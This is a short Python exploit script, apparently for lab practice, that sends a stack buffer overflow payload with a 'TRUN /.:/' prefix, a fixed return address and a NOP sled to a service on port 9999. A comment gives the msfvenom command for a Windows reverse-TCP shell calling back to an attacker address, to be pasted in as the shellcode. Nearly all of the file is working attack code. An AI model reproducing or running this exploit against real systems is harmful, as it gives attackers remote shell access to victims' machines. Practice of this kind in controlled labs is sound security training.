#!/bin/python

import sys
import socket 

overflow = () #place en terminal msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.53 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" and then copy and past it in here 


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.0.0.27',9999))
	s.send(('TRUN /.:/' + shellcode)) 
	s.close()

except:
	print ('error connecting to server')
	sys.exit()
